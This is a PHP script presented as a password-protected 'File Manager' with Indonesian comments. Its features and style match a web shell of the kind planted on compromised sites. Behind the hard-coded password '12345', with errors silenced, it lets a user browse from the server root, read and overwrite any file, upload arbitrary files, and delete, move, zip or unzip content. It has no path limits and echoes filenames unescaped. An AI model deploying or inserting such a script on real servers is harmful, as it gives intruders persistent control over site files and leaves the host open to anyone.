<?php
session_start();
error_reporting(0);
set_time_limit(0);

/* =========================
   CONFIG PASSWORD LOGIN
   ========================= */
$PASSWORD = '12345'; // GANTI PASSWORD

/* =========================
   LOGIN (PASSWORD ONLY)
   ========================= */
if (!isset($_SESSION['login'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_POST['pass'] === $PASSWORD) {
            $_SESSION['login'] = true;
            header("Location: ?");
            exit;
        } else {
            $err = "Password salah";
        }
    }
    ?>
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8">
    <title>Login</title>
    <style>
        body{background:#111;color:#0f0;font-family:monospace;padding:40px}
        input,button{background:#000;color:#0f0;border:1px solid #0f0;padding:6px}
    </style></head>
    <body>
        <h2>File Manager Login</h2>
        <?php if(isset($err)) echo "<p style='color:red'>$err</p>"; ?>
        <form method="post">
            <input type="password" name="pass" placeholder="Password">
            <button>Login</button>
        </form>
    </body></html>
    <?php exit;
}

/* =========================
   PATH & FUNCTIONS
   ========================= */
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();

function files($p){ return array_diff(scandir($p),['.','..']); }
function sizef($b){
    $u=['B','KB','MB','GB'];$i=0;
    while($b>=1024&&$i<3){$b/=1024;$i++;}
    return round($b,2).' '.$u[$i];
}

/* =========================
   SAVE EDIT FILE
   ========================= */
if(isset($_POST['savefile'])){
    file_put_contents($_POST['path'], $_POST['content']);
    header("Location: ?dir=".urlencode(dirname($_POST['path'])));
    exit;
}

/* =========================
   SHOW EDIT FILE
   ========================= */
if(isset($_GET['edit'])){
    $p = realpath($_GET['edit']);
    if(is_file($p)){
        $c = htmlspecialchars(file_get_contents($p));
        ?>
        <!DOCTYPE html>
        <html><head><meta charset="UTF-8">
        <title>Edit File</title>
        <style>
            body{background:#111;color:#0f0;font-family:monospace;padding:20px}
            textarea,button{background:#000;color:#0f0;border:1px solid #0f0;width:100%;padding:6px}
        </style></head>
        <body>
            <h3>Edit: <?=htmlspecialchars($p)?></h3>
            <form method="post">
                <input type="hidden" name="path" value="<?=htmlspecialchars($p)?>">
                <textarea name="content" rows="20"><?=$c?></textarea>
                <button name="savefile">Save</button>
            </form>
        </body></html>
        <?php exit;
    }
}

/* =========================
   HANDLE ACTIONS
   ========================= */
if($_SERVER['REQUEST_METHOD']==='POST'){
    if(isset($_POST['create_file'])){
        file_put_contents($dir.'/'.$_POST['filename'],$_POST['filecontent']);
    }
    if(isset($_POST['create_folder'])){
        mkdir($dir.'/'.$_POST['folder']);
    }
    if(isset($_POST['delete'])){
        $t=$dir.'/'.$_POST['delete'];
        is_dir($t)?rmdir($t):unlink($t);
    }
    if(isset($_POST['rename'])){
        rename($dir.'/'.$_POST['old'],$dir.'/'.$_POST['new']);
    }
    if(isset($_POST['move'])){
        rename($dir.'/'.$_POST['move'],$_POST['target']);
    }
    if(isset($_FILES['upload'])){
        move_uploaded_file($_FILES['upload']['tmp_name'],$dir.'/'.$_FILES['upload']['name']);
    }
    if(isset($_POST['zip'])){
        $z=new ZipArchive;
        $f=$dir.'/'.$_POST['zip'];
        if($z->open($f.'.zip',ZipArchive::CREATE)){
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f));
            foreach($it as $file){
                if(!$file->isDir()){
                    $z->addFile($file,$file->getRealPath());
                }
            }
            $z->close();
        }
    }
    if(isset($_POST['unzip'])){
        $z=new ZipArchive;
        if($z->open($dir.'/'.$_POST['unzip'])){
            $z->extractTo($dir);
            $z->close();
        }
    }
    header("Location: ?dir=".urlencode($dir));
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>File Manager</title>
<style>
body{background:#111;color:#0f0;font-family:monospace;padding:20px}
a{color:#0f0;text-decoration:none}
table{width:100%;border-collapse:collapse;margin-top:10px}
th,td{border:1px solid #0f0;padding:6px}
input,textarea,button{background:#000;color:#0f0;border:1px solid #0f0;padding:5px}
#newfile{display:none}
</style>
<script>
function toggle(){ 
  var f=document.getElementById('newfile');
  f.style.display=(f.style.display==='none')?'block':'none';
}
</script>
</head>
<body>

<h2>File Manager : <?=htmlspecialchars($dir)?></h2>
<a href="?dir=/">Root</a> |
<?php if($dir!='/'): ?>
<a href="?dir=<?=urlencode(dirname($dir))?>">Back</a>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<button>Upload</button>
</form>

<form method="post">
<input name="folder" placeholder="Folder name">
<button name="create_folder">Create Folder</button>
</form>

<button onclick="toggle()">Create File</button>
<form method="post" id="newfile">
<input name="filename" placeholder="file.txt"><br>
<textarea name="filecontent" rows="4"></textarea><br>
<button name="create_file">Save File</button>
</form>

<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php foreach(files($dir) as $f):
$p=$dir.'/'.$f;$d=is_dir($p);?>
<tr>
<td><a href="?dir=<?=urlencode(realpath($p))?>"><?=$f?></a></td>
<td><?=$d?'-':sizef(filesize($p))?></td>
<td>
<form method="post" style="display:inline">
<input type="hidden" name="delete" value="<?=$f?>">
<button>Delete</button>
</form>

<form method="post" style="display:inline">
<input type="hidden" name="old" value="<?=$f?>">
<input name="new" placeholder="Rename">
<button name="rename">Rename</button>
</form>

<?php if(is_file($p)): ?>
<a href="?edit=<?=urlencode($p)?>"><button>Edit</button></a>
<?php endif; ?>

<?php if(!$d && pathinfo($f,PATHINFO_EXTENSION)=='zip'): ?>
<form method="post" style="display:inline">
<input type="hidden" name="unzip" value="<?=$f?>">
<button>Unzip</button>
</form>
<?php endif; ?>

<?php if($d): ?>
<form method="post" style="display:inline">
<input type="hidden" name="zip" value="<?=$f?>">
<button>Zip</button>
</form>
<?php endif; ?>

<form method="post" style="display:inline">
<input type="hidden" name="move" value="<?=$f?>">
<input name="target" placeholder="/path/target">
<button>Move</button>
</form>
</td>
</tr>
<?php endforeach; ?>
</table>

</body>
</html>
